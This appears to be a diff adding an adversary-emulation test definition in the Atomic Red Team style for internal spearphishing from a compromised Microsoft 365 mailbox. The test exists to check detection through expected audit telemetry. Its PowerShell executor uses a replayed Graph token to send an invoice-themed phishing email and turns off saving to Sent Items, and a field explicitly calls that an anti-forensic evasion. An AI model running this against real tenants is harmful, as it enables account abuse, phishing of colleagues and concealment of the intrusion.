@@ -1,0 +1,75 @@
+attack_technique: T1566.002
+display_name: "Post-Exploitation – Internal Spearphishing via Compromised Mailbox"
+atomic_tests:
+  - name: "Send internal phishing email via Graph from compromised account"
+    auto_generated_guid: a9b0c1d2-e3f4-5678-abcd-678901234518
+    description: |
+      Sends a spearphishing email from the compromised victim's mailbox to
+      an internal target, using a Graph API delegated send. Because the email
+      originates from a legitimate internal address, it bypasses many external
+      email gateway controls. This atomic targets a lab counterparty mailbox.
+      Wraps Microsoft.Graph.Mail.
+    supported_platforms:
+      - windows
+      - linux
+      - macos
+    input_arguments:
+      tenant_id:
+        description: "Entra tenant ID of the lab tenant."
+        type: String
+        default: "00000000-0000-0000-0000-000000000000"
+      sender_user_id:
+        description: "User ID or UPN of the compromised sender mailbox."
+        type: String
+      recipient_address:
+        description: "Internal recipient UPN for the phishing email."
+        type: String
+        default: "lab-counterparty@labdomain.onmicrosoft.com"
+      email_subject:
+        description: "Email subject line."
+        type: String
+        default: "Urgent: Invoice Payment Confirmation Required"
+      email_body:
+        description: "Email body text."
+        type: String
+        default: "Please review and approve the attached invoice at your earliest convenience."
+      token_cache_path:
+        description: "Path to a Graph-scoped token cache file."
+        type: Path
+        default: "#{token_cache_path}"
+    executor:
+      name: powershell
+      command: |
+        Import-Module Microsoft.Graph.Mail -ErrorAction Stop
+
+        $token = (Get-Content -LiteralPath '#{token_cache_path}' -Raw | ConvertFrom-Json)
+        Connect-MgGraph -AccessToken ($token.accessToken | ConvertTo-SecureString -AsPlainText -Force) -NoWelcome
+
+        $message = @{
+            subject      = '#{email_subject}'
+            body         = @{ contentType = 'Text'; content = '#{email_body}' }
+            toRecipients = @(
+                @{ emailAddress = @{ address = '#{recipient_address}' } }
+            )
+        }
+
+        Send-MgUserMail -UserId '#{sender_user_id}' -Message $message -SaveToSentItems:$false
+        Write-Host "Internal phishing email sent from '#{sender_user_id}' to '#{recipient_address}'."
+    cleanup_command: |
+      Write-Host "No automated cleanup for sent email. Delete manually from Sent Items if needed."
+    references:
+      - "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-093a"
+    auth_profile: "graph-delegated"
+    defense_evasion: "Trusted internal sender bypasses external email gateways; SaveToSentItems=false reduces forensic artifacts"
+    requires_token:
+      from: "cookie-replay"
+      resource: "https://graph.microsoft.com"
+    expected_telemetry:
+      - source: ual
+        match:
+          Operations: "Send"
+          ItemType: "Message"
+        within_minutes: 20
+    exercises_chokepoint:
+      id: "DC-POSTEX-007"
+      url: "https://detectionchokepoints.com/postex/internal-phishing"
